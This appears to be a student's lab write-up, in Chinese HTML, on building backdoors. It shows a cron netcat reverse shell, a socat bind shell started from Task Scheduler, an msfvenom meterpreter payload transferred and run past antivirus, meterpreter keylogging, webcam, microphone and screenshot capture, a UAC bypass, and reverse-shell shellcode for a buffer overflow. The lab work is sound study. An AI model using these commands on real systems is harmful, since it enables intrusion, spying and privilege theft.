&lt;p&gt;&lt;span&gt;    前面在介绍nc工具时进行过简单的获取主机操作Shell，这里会完成该操作的进阶版本，即定时自动连接，这样就不用手动连接了，也就更像一个后门该有的样子了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;line&quot;&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317174402408-542216995.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    首先在kali中输入&lt;span&gt;crontab -e&lt;/span&gt;，然后选择第三个编辑器进入编辑，这次选过之后，以后就默认是这个了。之后就可以添加定时任务。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    进入编辑界面后，&lt;span&gt;按下a键&lt;/span&gt;，此时可以开始编辑，此时在最下面一行添加这样内容：&lt;span&gt;43 * * * * /bin/netcat 192.168.3.26 5215 -e /bin/sh&lt;/span&gt;。星号代表运行时间，分别是 ：分、时、日、月、每周七天中的某天。星号代表任意值，都是星号的话也就是说，任意年，任意月，任意时，任意分，任意日，都执行后接的命令。时间格式如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317181925159-1084121044.png&quot; alt=&quot;&quot; width=&quot;618&quot; height=&quot;171&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317180257527-1196673603.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    如上图所示，在编辑界面的最后一行添加如上信息，表示在每小时的&lt;span&gt;43&lt;/span&gt;分钟都会连接到IP地址为&lt;span&gt;192.168.1.100&lt;/span&gt;的主机的&lt;span&gt;4313&lt;/span&gt;端口，让他（Windows）调用自己（kali）的命令行，这正是一个典型的反弹连接。这条命令能够成功执行的前提是，Windows主机已经建立了一个侦听自己&lt;span&gt;4313&lt;/span&gt;端口的ncat服务器。毕竟连接是双向的，一方发出了申请，另一方连门都不开的话，这样肯定建立不了连接。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    编辑完成后，按下键盘左上角的&lt;span&gt;Esc&lt;/span&gt;，紧接着直接输入&lt;span&gt;:wq&lt;/span&gt;，然后回车，就可以保存退出了。这样就完成了新的定时任务的添加。等定时任务快开始时，就在Windows的命令行输入&lt;span&gt;ncat.exe -l -p 4313&lt;/span&gt;，这代表Windows开启了一个ncat服务器，随时监听&lt;span&gt;4313&lt;/span&gt;端口，一旦收到连接请求就可以考虑同意建立连接。这样，当时间一到，kali的定时任务开始执行后，kali就会反弹连接Windows主机，这时候Windows主机刚好在监听，那么建立连接就是水到渠成的事了。这里最好&lt;span&gt;实时验证&lt;/span&gt;，也就是刚添加完定时任务就立刻验证，所以定时的时间最好是几分钟后。如果时间久了，比如第二天再想来验证一下能不能建立连接，这时候Windows的IP地址可能就发生了改变，kali的定时任务即使执行了，也会因为苦于找不到目的地而失败。要想成功，就得根据Windows的最新IP地址修改kali的定时任务。所以为避免麻烦还是实时验证实时截图比较好。这和之前介绍ncat工具时做的反弹连接是类似的，连接建立成功的截图都是一样的，只不过kali的反弹连接请求由自己手动发出改为系统定时发出了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200318184811417-1828693170.png&quot; alt=&quot;&quot; width=&quot;474&quot; height=&quot;406&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在每小时的第&lt;span&gt;43&lt;/span&gt;分钟后(上图所示为第&lt;span&gt;44&lt;/span&gt;分钟)，kali已经向计划任务中指定的那个IP地址的指定端口发起了连接请求，在Windows这边，如上图所示，提前准备好监听，等时间一到自然就连接上了。此时输入kali指令&lt;span&gt;ls&lt;/span&gt;，输出结果是符合预期的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;4.2 使用&lt;span class=&quot;s2&quot;&gt;socat获取主机操作&lt;span class=&quot;s2&quot;&gt;Shell, 任务计划启动&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在Windows主机上按下&lt;span&gt;win+r&lt;/span&gt;，输入&lt;/span&gt;&lt;span&gt;compmgmt.msc&lt;/span&gt;&lt;span&gt;唤出计算机管理界面，在这里创建一个新的定时任务。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317195709230-794536066.png&quot; alt=&quot;&quot; width=&quot;570&quot; height=&quot;402&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图就是本地计算机管理界面，先后点击上图中第1、2个红框，创建任务。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317195829999-1468403773.png&quot; alt=&quot;&quot; width=&quot;574&quot; height=&quot;486&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在创建任务界面，一共要填够三大项内容，分别是上图所标示的&lt;span&gt;1、2、3&lt;/span&gt;三部分。在第&lt;span&gt;1&lt;/span&gt;部分填写一个便于识别的用户名称，其他默认即可。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317204035248-1341278713.png&quot; alt=&quot;&quot; width=&quot;500&quot; height=&quot;433&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在第&lt;span&gt;2&lt;/span&gt;部分选择新建一个触发器，无论如何能够让任务触发即可，这一部分设置灵活性较高。我选择按预定计划开始，时间就设在执行这一步操作的不久之后，以便于随做随验证。其他设置默认即可。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317204421775-17520722.png&quot; alt=&quot;&quot; width=&quot;483&quot; height=&quot;357&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    触发器设置好以后，会有上图所示的信息。接下来进行第&lt;span&gt;3&lt;/span&gt;步，新建一个操作。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317204740314-2022743911.png&quot; alt=&quot;&quot; width=&quot;308&quot; height=&quot;334&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    这里是使用socat工具获取Windows主机的Shell，所以在程序或脚本这一项需要填写socat工具的路径，具体到socat.exe这个应用程序，这是需要事先下载好的，前文有提到过。在参数方面，需要填&lt;/span&gt;&lt;span&gt;写&lt;span&gt;tcp-listen:4313 exec:cmd.exe,pty,stderr&lt;/span&gt;，这个命令的作用是把cmd.exe绑定到端口4313，同时把cmd.exe的stderr重定向到stdout上。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317214517904-560478509.png&quot; alt=&quot;&quot; width=&quot;515&quot; height=&quot;363&quot;/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    这样就添加了一个新的任务计划程序，并且从上图红框可以看出它正处于准备就绪状态，到点就开始运行了，即使错过了定时的时间点，也可以直接右键单击该任务然后选择执行，这样可以随时执行。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317215121657-1854396779.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图即是运行状态下的新任务。开始运行后，Windows会弹出一个命令行窗口，让它开着不要关闭。此时在kali中输入&lt;/span&gt;&lt;span&gt;socat - tcp:192.168.1.100:4313&lt;/span&gt;&lt;span&gt;，通过socat方式连接Windows主机的&lt;span&gt;tcp4313&lt;/span&gt;端口。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317220244160-487877193.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    如上所示，双方通过socat成功建立起了连接，kali调用了Windows主机的Shell，并且这个Shell当前所在的目录是一个系统文件夹，我们用dir命令来查看一下的话，可以发现有海量的文件和文件夹。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317222311274-193210967.png&quot; alt=&quot;&quot; width=&quot;511&quot; height=&quot;451&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在当前页面按下&lt;span&gt;ctrl+c&lt;/span&gt;，可以断开socat连接。不用这个连接后，可以回到任务程序计划库，将正在运行的任务关闭，让其回归就绪状态，如下所示：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317223016048-1748351717.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;4.3 &lt;span class=&quot;s1&quot;&gt;使用MSF meterpreter（或其他软件）&lt;span class=&quot;s1&quot;&gt;生成可执行文件，利用ncat&lt;span class=&quot;s1&quot;&gt;或socat&lt;span class=&quot;s1&quot;&gt;传送到主机并运行获取主机Shell。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;    在kali中运行命令&lt;/span&gt;：&lt;span&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.159.130 LPORT=4313 -f exe &amp;gt; 20174313_backdoor.exe&lt;/span&gt;&lt;span&gt;，IP地址填kali的，该命令执行成功后，会生成一个后门可执行程序：&lt;span&gt;20174313_backdoor.exe&lt;/span&gt;，文件名是自拟的，文件后缀是前面参数f设定好的。文件成功生成的截图如下：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317231257091-987096193.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    由上图可知这个可执行文件大小约为73KB，然后，在Windows命令行中进入ncat目录下，执行命令&lt;span&gt;ncat.exe -l 4313 &amp;gt; 20174313_backdoor.exe&lt;/span&gt;，这样被控主机也就是Windows主机就进入了接收文件模式，在kali中执行命令&lt;span&gt;nc 192.168.1.100 4313 &amp;lt; 20174313_backdoor.exe&lt;/span&gt;，IP地址填Windows主机的，将刚刚生成的文件从kali发送到Windows主机。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317231618894-951018963.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;    上图红框所示即为Windows主机从kali那里刚刚接收到的后门文件。我在接收文件的时候，发现无论是Windows还是kali端，命令行都是处于刚刚输入完命令的样子，没有新的提示，也不知道文件传完了没有。我就在Windows端的ncat文件夹里隔段时间刷新一下看&lt;span&gt;20174313_backdoor.exe&lt;/span&gt;文件的大小，因为在kali中已经获悉了该文件的具体大小，那么只要在Windows中看到这个文件的大小已经够了，那就可以用ctrl+c中断连接了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    下面在kali中输入msfconsole，进入MSF控制台。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317232137935-1490992864.png&quot; alt=&quot;&quot; width=&quot;484&quot; height=&quot;478&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;    上图选自码云本课程的后门实践讲义，详细介绍了在MSF上打开监听的步骤。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    进入控制台后，输入&lt;/span&gt;&lt;span&gt;&lt;span&gt;use exploit/multi/handler&lt;/span&gt;&lt;span&gt;，使用监听模块；然后输入&lt;/span&gt;&lt;/span&gt;&lt;span&gt;set payload windows/meterpreter/reverse_tcp&lt;/span&gt;&lt;span&gt;&lt;span&gt;，使用指定的payload，它与生成后门程序时使用的payload必须是一样的；生成后门程序是使用的IP地址和端口号，也都要和刚刚生成后门程序时的一致&lt;span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317233218499-711764562.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    如上图所示，在命令行中一直输入命令直到&lt;span&gt;exploit&lt;/span&gt;，此时kali试图建立一个针对本机&lt;span&gt;4313&lt;/span&gt;端口的反向TCP连接。接下来需要在Windows上运行一下刚刚从kali那里接收到的后门程序，运行时可能会被杀毒软件提示有问题，这里毫无疑问是选择信任自己而不是杀软。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317233445267-572699492.png&quot; alt=&quot;&quot; width=&quot;237&quot; height=&quot;356&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;    我的这次运行被联想电脑管家拦截住了，我在杀软里选择信任该程序，然后再次运行，此时Windows端会主动连接kali，连接成功后，kali这边就获得了Windows的命令行。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317233631749-379961213.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    此时就可以在kali端操作Windows端了，比如，在这里输入dir命令，查看此时Windows端命令行所在的目录下都有哪些目录和文件。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317233950416-239103795.png&quot; alt=&quot;&quot; width=&quot;509&quot; height=&quot;219&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    如上图所示，这对于一个指定目录下的全部内容来说相当于是被彻查了户口， 包括权限、大小、类型、最后修改时间还有文件名。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;4.4 使用&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;span class=&quot;s2&quot;&gt;&lt;strong&gt;MSF meterpreter（或其他软件）生成获取目标主机音频、摄像头、击键记录等内容，并尝试提权&lt;/strong&gt;&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span class=&quot;s2&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    以下都是在kali上针对Windows端的后门操作。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·获取音频。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317234656455-1234906064.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    输入&lt;span&gt;record_mic&lt;/span&gt;，获取Windows主机所处的物理环境下的一段声音。获取完成的音频会被存储在一个指定的路径，我们找到这个路径，果然发现了刚刚录的音频。它还有好多厉害的参数，参见&lt;a href=&quot;https://blog.csdn.net/ban47491/article/details/101082397&quot; target=&quot;_blank&quot;&gt;这里&lt;/a&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317234827626-936251966.png&quot; alt=&quot;&quot; width=&quot;416&quot; height=&quot;329&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;    ·获取摄像头。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317235518474-1127253848.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;    输入&lt;span&gt;webcam_snap&lt;/span&gt;，调用Windows端的摄像头拍个照然后存储在一个指定的路径。拍完之后照片会直接显示出来，还可以找到这个路径，把照片拖到Windows端的桌面上，在Windows上照样可以查看。&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317235241573-214742112.png&quot; alt=&quot;&quot; width=&quot;485&quot; height=&quot;323&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·获取击键记录。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317235537910-1306362718.png&quot; alt=&quot;&quot; width=&quot;624&quot; height=&quot;147&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     &lt;span&gt;keyscan_start&lt;/span&gt;作用是打开键盘记录，&lt;span&gt;keyscan_stop&lt;/span&gt;是结束键盘记录，&lt;span&gt;keyscan_dump&lt;/span&gt;是导出键盘记录。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    上图红线强调的部分即为从打开键盘记录后到导出键盘记录之间我所敲打过的按键都有哪些。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·获取截屏。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200317235934945-1713756479.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    输入&lt;span&gt;screenshot&lt;/span&gt;，获取Windows端的实时屏幕截图，同时也有截图的存储路径。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/1947537/202003/1947537-20200318000034052-1713349315.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    ·提权&lt;/span&gt;&lt;span&gt;通过后门入侵到目标系统，攻击者往往会想方设法提高自己入侵身份的权限，提到最高权限最好，那样可以在被入侵的系统中执行任意操作，真的就是做到了为所欲为。在Windows10中，由于UAC（&lt;span&gt;User Account Control，用户账户控制&lt;/span&gt;）更新得比较先进，所以简单的一条提权指令是不能成功执行的，会给出失败提示，&lt;span&gt;riv_elevate_getsystem:Operation failed: The environment is incorrect. The following was attempted:[-] Named Pipe Impersonation (In Memory/Admin)&lt;/span&gt;&lt;/span&gt;&lt;span&gt;[-] Named Pipe Impersonation (Dropper/Admin)[-] Token Duplication (In Memory/Admin)。&lt;span&gt;放进百度翻译，大意是说环境不正确，提权指令&lt;span&gt;riv_elevate_getsystem&lt;/span&gt;失败，哪些操作失败了呢？有三个操作，分别是上面三个减号后面的东西，总之kali就是说它很努力了但还是不成功。我在完瑞同学的博客中找到了&lt;a href=&quot;https://blog.csdn.net/qq389674856/article/details/82289275&quot; target=&quot;_blank&quot;&gt;这篇博客&lt;/a&gt;，我从中找到了一种能够成功提权的方法。&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;    首先还是先输入msfconsole，进入MSF命令行，进行如下操作：&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200318213328835-58960446.png&quot; alt=&quot;&quot; width=&quot;465&quot; height=&quot;109&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;    如上图所示，&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;&lt;span&gt;输入&lt;span&gt;use exploit/multi/handler，获取multi/hander模块&lt;/span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span&gt;输入&lt;span&gt;use exploit/windows/local/ask。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;输入set payload windows/meterpreter/reverse_tcp，指定payload&lt;/span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;输入set lhost 192.168.159.130，这里填kali的IP地址。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;输入&lt;span&gt;set filename win_update.exe&lt;/span&gt;。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;输入&lt;span&gt;set session 1，设定会话序号。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;输入options，可以查看当前在Windows/local/ask下面的设置都有哪些。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200318213242315-1358674068.png&quot; alt=&quot;&quot; width=&quot;484&quot; height=&quot;330&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;    以上便是先前输入的那么多命令的设置效果，这些设置都到位了。下面继续输入exploit，执行刚刚生成的win_update.exe文件。执行之前得确保杀毒软件没有开着，否则会出现类似于下面的情况。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200318200638250-631451825.png&quot; alt=&quot;&quot; width=&quot;227&quot; height=&quot;341&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    这是联想电脑管家给出的风险提示，给出提示的时候它已经中断了exe文件的执行，所以我需要在命令行中再执行一遍，也就是再输入一次exploit，下面是执行效果。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200318213546187-1834107216.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    如上图所示，这时候再输入getsystem，就会出现成功获取系统权限的提示，后面还跟了一个获取的途径。成功提权后，自然就可以执行很多普通权限下无法执行的操作。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;4.5 （选做）使用MSF生成shellcode,注入到实践1中的pwn1中，获取反弹连接Shell&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    首先是设置堆栈可行并且关闭地址随机化，设置完要紧接着验证一下。这样设置是为了简化实验过程，为本操作的成功执行创设条件。我们用&lt;span&gt;execstack -s pwn1&lt;/span&gt;来设置堆栈可行，用&lt;span&gt;execstack -q pwn1&lt;/span&gt;来验证堆栈可行有没有设置成功，看见“&lt;span&gt;X 文件名&lt;/span&gt;”这种格式的输出就代表设置成功了；用&lt;span&gt;sudo sh -c &quot; echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&quot;&lt;/span&gt;来关闭地址随机化，作用是往一个指定的文件里写了一个0，用&lt;span&gt;&lt;span&gt;more &lt;/span&gt;&lt;span&gt;&lt;span&gt;/proc/sys/kernel/randomize_va_space&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span&gt;来验证有没有关闭成功，这一条命令的输出如果是&lt;span&gt;0&lt;/span&gt;的话就表示关闭成功了，因为刚刚写的就是&lt;span&gt;0&lt;/span&gt;，否则，非&lt;span&gt;0&lt;/span&gt;的输出都表示没有关闭成功。一般都能关成功的，只要命令执行成功了。下面是我执行这些指令的经过。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200318223718155-475687936.png&quot; alt=&quot;&quot; width=&quot;510&quot; height=&quot;314&quot;/&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;    为了完成以上操作我还特意回顾了下我的实验一博客，因为我还是出现了权限不够的问题。另外需要注意一点的是这些命令应该在&lt;span&gt;pwn1&lt;/span&gt;所在的文件夹里执行，否则就要在&lt;span&gt;pwn1&lt;/span&gt;前面加上该文件的地址。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    下面需要做的，和实验一的第三个操作就很类似了，我们需要通过这个操作找到getShell函数的首地址。然后把首地址写入下面这段代码中：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:Perl;gutter:true;&quot;&gt;
perl -e 'print &quot;A&quot; x 32;print&quot;\x&lt;span&gt;**&lt;/span&gt;\x&lt;span&gt;**&lt;/span&gt;\xff\xff\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\xb8\x80\xff\xff\xfe\x83\xf0\xff\x50\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\xb2\x10\x31\xc0\x66\xb8\x6a\x01\xcd\x80\x85\xc0\x75\x24\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xb3\x01\x31\xc0\xb0\x01\xcd\x80&quot;' &amp;gt; input_2
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;    上面代码中的&lt;span&gt;16&lt;/span&gt;进制数部分有四个星号，这四个星号加上后面的ffff(一般都是这个，不会变的，只有前四个不同的人可能会不一样)，组到一起就是上面提到的首地址，这是我们要寻找的东西。如何寻找呢？大家可以回忆一下自己实验一的这部分操作是如何完成的。简单来说，是需要两个命令行窗口(确保堆栈可用和地址随机化都已经按规定设置)，第一个，窗口运行自己的&lt;span&gt;pwn1&lt;/span&gt;文件，比如在文件所在的目录下输入&lt;span&gt;./pwn1&lt;/span&gt;。然后在第二个窗口，输入&lt;span&gt;ps -ef | grep pwn1&lt;/span&gt;，查看&lt;span&gt;pwn1&lt;/span&gt;的进程号，比如我的是&lt;span&gt;7768&lt;/span&gt;，我先记下这个值。然后在当前命令行中开启&lt;span&gt;gdb工具&lt;/span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200318235901939-881626771.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;    如上图所示，输入到gdb后，接下来会出现很多启动信息，不用管直到自己可用输入内容为止。gdb启动完成后，我们输入&lt;span&gt;attach 7768&lt;/span&gt;调试进程，参数用到了刚刚查到的进程号。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1947537/202003/1947537-20200319000127062-1774392239.png&quot; alt=&quot;&quot; width=&quot;401&quot; height=&quot;123&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    输入过上面那条指令后，命令行又会给出许多信息，照样不用管直到下一个可用输入指令的时候。&lt;/span&gt;&lt;/p&gt;
